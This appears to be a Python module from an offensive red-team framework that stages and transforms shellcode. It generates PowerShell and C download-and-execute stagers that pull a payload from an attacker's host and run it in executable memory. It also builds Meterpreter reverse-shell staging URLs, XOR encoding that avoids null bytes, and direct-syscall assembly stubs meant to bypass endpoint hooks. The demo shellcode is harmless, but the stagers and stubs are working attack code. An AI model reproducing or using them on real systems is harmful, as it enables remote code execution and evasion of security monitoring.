"""Shellcode staging, transformation, and analysis module.

Maps to MITRE T1027.002 — Software Packing / T1106 — Native API.
"""

from __future__ import annotations

import base64
import secrets

from rich.table import Table
from rich import box

from ghost.logger import console, info, ok, warn, section
from ghost.models import AttackResult, EngagementContext
from ghost.utils.artifacts import save_artifact
from ghost.utils.crypto import xor_bytes, calc_entropy
from ghost.modules.base import BaseModule


class ShellcodeModule(BaseModule):
    """Shellcode staging, transformation, and analysis.
    Maps to MITRE T1027.002 — Software Packing / T1106 — Native API.
    """

    name = "Shellcode Staging & Transformation"

    def run(self, ctx: EngagementContext) -> None:
        section("Module 5 — Shellcode Staging & Transformation [T1027/T1106]")

        # Demo shellcode (NOP sled + INT3 — harmless)
        demo_sc = bytes([0x90] * 8 + [0xCC] + [0x90] * 7)
        info(f"Working with demo shellcode ({len(demo_sc)} bytes)")

        # -- Format Converters --
        info("Generating shellcode format conversions...")
        formats = {
            "hex_string": demo_sc.hex(),
            "c_array": "unsigned char sc[] = { " + ", ".join([f"0x{b:02x}" for b in demo_sc]) + " };",
            "python_bytes": "sc = b'" + "".join([f"\\x{b:02x}" for b in demo_sc]) + "'",
            "powershell_array": "[Byte[]] $sc = @(" + ", ".join([f"0x{b:02X}" for b in demo_sc]) + ")",
            "csharp_array": "byte[] sc = new byte[] { " + ", ".join([f"0x{b:02x}" for b in demo_sc]) + " };",
            "base64": base64.b64encode(demo_sc).decode(),
        }

        table = Table(title="Shellcode Format Conversions", box=box.ROUNDED)
        table.add_column("Format", style="cyan", width=18)
        table.add_column("Output Preview", max_width=52)
        for fmt, val in formats.items():
            preview = val[:80] + "..." if len(val) > 80 else val
            table.add_row(fmt.replace("_", " ").title(), preview)
        console.print(table)
        ok(f"Generated {len(formats)} format conversions")

        # -- XOR Encoder with null-byte avoidance --
        info("Encoding shellcode with XOR (null-byte avoidance)...")
        xor_key = self._find_safe_xor_key(demo_sc)
        xor_encoded = xor_bytes(demo_sc, bytes([xor_key]))
        null_count = xor_encoded.count(0)
        if null_count > 0:
            warn(f"XOR-encoded output contains {null_count} null bytes — trying multi-byte key")
            xor_key_multi = self._find_safe_multibyte_key(demo_sc, 4)
            xor_encoded = xor_bytes(demo_sc, xor_key_multi)
            ok(f"Multi-byte XOR key: {xor_key_multi.hex()} — null bytes: {xor_encoded.count(0)}")
        else:
            ok(f"Single-byte XOR key: 0x{xor_key:02x} — zero null bytes in output")

        # -- Stager Generation --
        info("Generating download-and-execute stager...")
        stager_ps = self._gen_stager_ps(ctx)
        stager_c = self._gen_stager_c(ctx)
        save_artifact(ctx, "stager.ps1", stager_ps)
        save_artifact(ctx, "stager.c", stager_c)
        ok(f"HTTP stager generated — Stage URL: http://{ctx.lhost}:{ctx.lport}/stage")

        # -- Meterpreter URL Generator --
        info("Generating Meterpreter staging URLs...")
        met_urls = [
            f"http://{ctx.lhost}:{ctx.lport}/reverse_tcp",
            f"https://{ctx.lhost}:443/reverse_https",
            f"http://{ctx.lhost}:{ctx.lport}/{secrets.token_hex(4)}",
        ]
        for url in met_urls:
            ok(f"  Stage URL: {url}")

        # -- Syscall Stub Generation --
        info("Generating direct syscall stubs (ntdll bypass)...")
        syscall_stub = self._gen_syscall_stubs(ctx)
        path = save_artifact(ctx, "syscall_stubs.asm", syscall_stub)
        ok(f"Syscall stubs saved to {path}")
        warn("Syscall numbers vary by Windows build — verify against target OS version")

        # -- Shellcode Analysis --
        info("Analyzing shellcode properties...")
        analysis = {
            "size": len(demo_sc),
            "null_bytes": demo_sc.count(0),
            "bad_chars": self._find_bad_chars(demo_sc),
            "entropy": calc_entropy(demo_sc),
            "nop_sled_detected": demo_sc[:4] == b'\x90\x90\x90\x90',
        }

        table = Table(title="Shellcode Analysis", box=box.ROUNDED)
        table.add_column("Property", style="cyan")
        table.add_column("Value", justify="right")
        table.add_column("Assessment")
        table.add_row("Size", f"{analysis['size']} bytes",
                       "OK" if analysis['size'] < 4096 else "Large — consider staging")
        table.add_row("Null Bytes", str(analysis['null_bytes']),
                       "[green]Clean[/green]" if analysis['null_bytes'] == 0 else f"[red]{analysis['null_bytes']} found[/red]")
        table.add_row("Bad Characters", str(len(analysis['bad_chars'])),
                       "[green]None[/green]" if not analysis['bad_chars'] else f"[yellow]{', '.join(f'0x{b:02x}' for b in analysis['bad_chars'][:5])}[/yellow]")
        table.add_row("Entropy", f"{analysis['entropy']:.4f}",
                       "[green]Low[/green]" if analysis['entropy'] < 6.0 else "[yellow]Moderate[/yellow]")
        table.add_row("NOP Sled", str(analysis['nop_sled_detected']),
                       "[yellow]Detected[/yellow]" if analysis['nop_sled_detected'] else "Clean")
        console.print(table)

        # -- Save all formats --
        fmt_artifact = "\n\n".join([f"// Format: {k}\n{v}" for k, v in formats.items()])
        save_artifact(ctx, "shellcode_formats.txt", fmt_artifact)
        ok("All shellcode formats saved")

        ctx.results.append(AttackResult(
            module="shellcode", action="stage_and_transform", status="ok",
            severity="high",
            notes=f"Generated {len(formats)} format conversions, stagers, syscall stubs, and analysis"
        ))

    @staticmethod
    def _find_safe_xor_key(data: bytes) -> int:
        for key in range(1, 256):
            encoded = bytes([b ^ key for b in data])
            if 0 not in encoded:
                return key
        return 0x41  # fallback

    @staticmethod
    def _find_safe_multibyte_key(data: bytes, key_len: int) -> bytes:
        for _ in range(100):
            key = secrets.token_bytes(key_len)
            encoded = xor_bytes(data, key)
            if 0 not in encoded:
                return key
        return secrets.token_bytes(key_len)

    @staticmethod
    def _find_bad_chars(data: bytes, bad_list=None) -> list:
        if bad_list is None:
            bad_list = [0x00, 0x0a, 0x0d, 0x20, 0x25, 0x26, 0x2b, 0x3d]
        return [b for b in bad_list if b in data]

    @staticmethod
    def _gen_stager_ps(ctx: EngagementContext) -> str:
        return (
            f"# PowerShell Download-and-Execute Stager\n"
            f"# Fetches shellcode from HTTP server and executes in memory\n\n"
            f"$url = 'http://{ctx.lhost}:{ctx.lport}/stage'\n"
            f"$wc = New-Object System.Net.WebClient\n"
            f"$sc = $wc.DownloadData($url)\n\n"
            f"$k32 = Add-Type -MemberDefinition @\"\n"
            f"[DllImport(\"kernel32.dll\")] public static extern IntPtr VirtualAlloc(IntPtr a, uint b, uint c, uint d);\n"
            f"[DllImport(\"kernel32.dll\")] public static extern IntPtr CreateThread(IntPtr a, uint b, IntPtr c, IntPtr d, uint e, IntPtr f);\n"
            f"[DllImport(\"kernel32.dll\")] public static extern UInt32 WaitForSingleObject(IntPtr a, UInt32 b);\n"
            f"\"@ -Name 'K32' -Namespace 'Win32' -PassThru\n\n"
            f"$addr = $k32::VirtualAlloc(0, [uint32]$sc.Length, 0x3000, 0x40)\n"
            f"[System.Runtime.InteropServices.Marshal]::Copy($sc, 0, $addr, $sc.Length)\n"
            f"$thread = $k32::CreateThread(0, 0, $addr, 0, 0, 0)\n"
            f"$k32::WaitForSingleObject($thread, [uint32]'0xFFFFFFFF')\n"
        )

    @staticmethod
    def _gen_stager_c(ctx: EngagementContext) -> str:
        return (
            f"// C Download-and-Execute Stager\n"
            f"// Fetches shellcode via HTTP and executes from allocated memory\n\n"
            f"#include <windows.h>\n#include <wininet.h>\n#include <stdio.h>\n"
            f"#pragma comment(lib, \"wininet.lib\")\n\n"
            f"int main() {{\n"
            f"    HINTERNET hInternet = InternetOpenA(\"Mozilla/5.0\", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);\n"
            f"    HINTERNET hUrl = InternetOpenUrlA(hInternet,\n"
            f"        \"http://{ctx.lhost}:{ctx.lport}/stage\", NULL, 0,\n"
            f"        INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, 0);\n\n"
            f"    BYTE buf[4096];\n"
            f"    DWORD bytesRead = 0;\n"
            f"    DWORD totalRead = 0;\n"
            f"    BYTE* payload = (BYTE*)VirtualAlloc(NULL, 1024*1024,\n"
            f"                                        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);\n\n"
            f"    while (InternetReadFile(hUrl, buf, sizeof(buf), &bytesRead) && bytesRead > 0) {{\n"
            f"        memcpy(payload + totalRead, buf, bytesRead);\n"
            f"        totalRead += bytesRead;\n"
            f"    }}\n\n"
            f"    InternetCloseHandle(hUrl);\n"
            f"    InternetCloseHandle(hInternet);\n\n"
            f"    ((void(*)())payload)();\n"
            f"    return 0;\n}}\n"
        )

    @staticmethod
    def _gen_syscall_stubs(ctx: EngagementContext) -> str:
        arch = ctx.arch
        if arch == "x64":
            return (
                "; Direct Syscall Stubs — x64\n"
                "; Bypass ntdll.dll userland hooks by issuing syscalls directly\n"
                "; WARNING: Syscall numbers are Windows-build-specific\n\n"
                "; NtAllocateVirtualMemory (Win10 21H2: 0x18)\n"
                "NtAllocateVirtualMemory PROC\n"
                "    mov r10, rcx\n"
                "    mov eax, 18h          ; syscall number — VERIFY for target build\n"
                "    syscall\n"
                "    ret\n"
                "NtAllocateVirtualMemory ENDP\n\n"
                "; NtWriteVirtualMemory (Win10 21H2: 0x3A)\n"
                "NtWriteVirtualMemory PROC\n"
                "    mov r10, rcx\n"
                "    mov eax, 3Ah\n"
                "    syscall\n"
                "    ret\n"
                "NtWriteVirtualMemory ENDP\n\n"
                "; NtCreateThreadEx (Win10 21H2: 0xC1)\n"
                "NtCreateThreadEx PROC\n"
                "    mov r10, rcx\n"
                "    mov eax, 0C1h\n"
                "    syscall\n"
                "    ret\n"
                "NtCreateThreadEx ENDP\n\n"
                "; NtProtectVirtualMemory (Win10 21H2: 0x50)\n"
                "NtProtectVirtualMemory PROC\n"
                "    mov r10, rcx\n"
                "    mov eax, 50h\n"
                "    syscall\n"
                "    ret\n"
                "NtProtectVirtualMemory ENDP\n"
            )
        else:
            return (
                "; Direct Syscall Stubs — x86\n"
                "; Bypass ntdll.dll userland hooks\n\n"
                "; NtAllocateVirtualMemory\n"
                "_NtAllocateVirtualMemory@24 PROC\n"
                "    mov eax, 18h\n"
                "    mov edx, offset _sysentry\n"
                "    call edx\n"
                "    ret 24\n"
                "_NtAllocateVirtualMemory@24 ENDP\n\n"
                "_sysentry PROC\n"
                "    mov edx, esp\n"
                "    sysenter\n"
                "    ret\n"
                "_sysentry ENDP\n"
            )
